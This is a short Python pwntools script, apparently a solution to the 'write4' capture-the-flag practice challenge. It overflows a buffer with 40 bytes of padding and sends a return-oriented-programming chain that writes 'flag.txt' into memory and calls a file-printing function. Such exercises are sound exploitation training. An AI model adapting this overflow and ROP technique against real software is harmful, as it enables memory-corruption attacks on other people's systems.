from pwn import *

challenge = process("./write4")

ending = 5*"\x00"


def writeStringRop(value, dest):
	returnString = "\x90\x06\x40" + ending 
	returnString += dest
	returnString += value 
	returnString += ("\x28\x06\x40" + ending)
	return returnString


printfile = "\x10\x05\x40" + ending
popfirstarg = "\x93\x06\x40" + ending

hole = "\x28\x10\x60"+ending
payload = "A"*40 + writeStringRop("flag.txt", hole) + popfirstarg + hole + printfile

#for i in range(0, 5):
#	print(challenge.readline())

challenge.sendafter(">", payload)
#challenge.sendline(payload)

for i in range(0,10):
	print(challenge.readline())

